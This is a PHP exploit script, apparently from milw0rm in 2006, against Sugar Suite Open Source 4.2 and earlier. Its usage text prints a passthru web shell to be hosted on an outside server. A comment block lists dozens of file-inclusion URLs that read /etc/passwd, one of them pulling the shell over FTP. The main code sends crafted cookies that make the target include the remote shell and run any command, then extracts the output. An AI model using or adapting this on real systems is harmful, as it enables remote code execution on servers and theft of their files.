#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Sugar Suite Open Source <= 4.2 \"OptimisticLock!\" arbitrary remote inclusion exploit\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "this is called the \"five claws of Sun-tzu\"\r\n\r\n";

if ($argc<5) {
echo "Usage: php ".$argv[0]." host path location cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to sugar suite\r\n";
echo "location:  an arbitrary location with the code to include\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /sugar/ http://somehost.com/shell.txt ls -la\r\n";
echo "php ".$argv[0]." localhost /sugar/ http://somehost.com/shell.txt ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / http://somehost.com/shell.txt ls -la -P1.1.1.1:80\r\n\r\n";
echo "note, you need this code in http://somehost.com/shell.txt\r\n";
echo "<?php\r\n";
echo "if (get_magic_quotes_gpc()){\$_REQUEST[\"cmd\"]=stripslashes(\$_REQUEST[\"cmd\"]);}\r\n";
echo "ini_set(\"max_execution_time\",0);\r\n";
echo "echo \"*delim*\";\r\n";
echo "passthru(\$_REQUEST[\"cmd\"]);\r\n";
echo "echo \"*delim*\";\r\n";
echo "?>\r\n";
die;
}

/* software site: http://www.sugarcrm.com/crm/

   i) vulnerable code in modules/OptimisticLock/LockResolve.php:

   ...
   if(empty($GLOBALS['sugarEntry'])) die('Not A Valid Entry Point'); //<--- the f@ke protection, nearly in all files
   ...
   if(isset($_SESSION['o_lock_object'])){
	global $beanFiles, $moduleList;
	$object = 	$_SESSION['o_lock_object'];
	require_once($beanFiles[$beanList[$_SESSION['o_lock_module']]]);
	$current_state = new $_SESSION['o_lock_class']();
	$current_state->retrieve($object['id']);

	if(isset($_REQUEST['save'])){
		$_SESSION['o_lock_fs'] = true;
		echo  $_SESSION['o_lock_save'];
		die();
	}else{
		display_conflict_between_objects($object, $current_state->toArray(),$current_state->field_defs, $current_state->module_dir, $_SESSION['o_lock_class']);
}}else{
	echo 'No Locked Objects';
}
...

you can include files from local & remote resources and launch commands, poc:

with register_globals = On & allow_url_fopen = On:
http://[target]/[path]/modules/OptimisticLock/LockResolve.php?GLOBALS[sugarEntry]=1&_SESSION[o_lock_object]=1&_SESSION[o_lock_module]=1&beanList[1]=1&beanFiles[1]=http://somehost.com/someshell.txt
with register_globals = On:
http://[target]/[path]/modules/OptimisticLock/LockResolve.php?GLOBALS[sugarEntry]=1&_SESSION[o_lock_object]=1&_SESSION[o_lock_module]=1&beanList[1]=1&beanFiles[1]=../../../../../../../../etc/passwd

ii) arbitrary local inclusion issues in a lot of files:

with register_globals = On & magic_quotes_gpc = Off:
http://[target]/[path]/modules/Administration/CustomizeFields.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Administration/Development.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Administration/DstFix.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Administration/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
http://[target]/[path]/include/SubPanel/SubPanelViewer.php?GLOBALS[sugarEntry]=1&module=1&record=1&beanList[1]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Accounts/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Administration/Upgrade.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Bugs/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Calendar/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Calls/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/CampaignLog/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Campaigns/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Campaigns/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/CampaignTrackers/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Cases/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Contacts/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Dashboard/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Documents/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Dropdown/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Dropdown/Popup.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/DynamicFields/Popup.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/EditCustomFields/EditView.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/EditCustomFields/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/EmailMan/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Emails/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/EmailTemplates/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Feeds/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Home/PopupSugar.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Leads/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/MailMerge/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Meetings/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Notes/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Opportunities/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Project/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Project/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/ProjectTask/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/ProspectLists/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Prospects/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Roles/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Tasks/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Users/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
http://[target]/[path]/modules/Users/Login.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00

with register_globals=On:
http://[target]/[path]/modules/Administration/RebuildAudit.php?GLOBALS[sugarEntry]=1&beanFiles[1]=../../../../../../../../../../../../../etc/passwd

and (on PHP5) arbitrary remote inclusion, including a file from a ftp resource:

http://[target]/[path]/modules/Administration/RebuildAudit.php?cmd=ls%20-la&GLOBALS[sugarEntry]=1&beanFiles[1]=ftp://username:password@somehost.com/shell.txt

this is the exploit tool for i)
									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}
$host=$argv[1];
$path=$argv[2];
$loc=urlencode($argv[3]);
if (($path[0]<>'/') | ($path[strlen($path)-1]<>'/'))
{die("Check the path, it must begin and end with a trailing slash\r\n");}
$port=80;
$proxy="";
$cmd="";
for ($i=4; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{
$cmd.=" ".$argv[$i];
}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}

$packet ="GET ".$p."modules/OptimisticLock/LockResolve.php HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n";
$packet.="Host: ".$host."\r\n";
//through cookies, it's the same, maybe can bypass some ids...
$packet.="Cookie: GLOBALS[sugarEntry]=1; _SESSION[o_lock_object]=1; _SESSION[o_lock_module]=1; beanList[1]=1; beanFiles[1]=".$loc."; cmd=".$cmd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"*delim*"))
{
  echo "Exploit succeeded...";
  $temp=explode("*delim*",$html);
  die("\r\n".$temp[1]."\r\n");
}
else
{
 if (strstr($html,"Not A Valid Entry Point")) {echo "register_globals off here...\r\n";}
 echo "Exploit failed...";
}
?>

# milw0rm.com [2006-05-14]
